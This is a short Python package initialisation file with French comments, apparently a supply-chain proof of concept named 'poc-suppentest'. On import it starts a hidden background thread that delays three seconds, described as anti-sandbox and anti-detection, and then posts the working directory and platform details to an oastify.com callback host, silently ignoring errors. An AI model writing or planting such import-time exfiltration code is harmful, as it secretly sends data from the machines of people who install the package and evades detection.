"""Payload automatique à l'import du package"""

import threading
import time
import requests
import platform
import os
from datetime import datetime

def exfil_on_import():
    """Exfiltre dès l'import"""
    try:
        data = {
            'event': 'import',
            'package': 'poc-suppentest',
            'cwd': os.getcwd(),
            'platform': platform.platform(),
            'timestamp': datetime.now().isoformat()
        }
        requests.post(
            "https://5ciiprl9l4hsskvexnv888cjnat1hu5j.oastify.com/import",
            json=data,
            timeout=5
        )
    except:
        pass

# Thread différé pour éviter détection
def delayed_exfil():
    time.sleep(3)  # Anti-sandbox
    exfil_on_import()

thread = threading.Thread(target=delayed_exfil, daemon=True)
thread.start()

__version__ = "1.0.0"
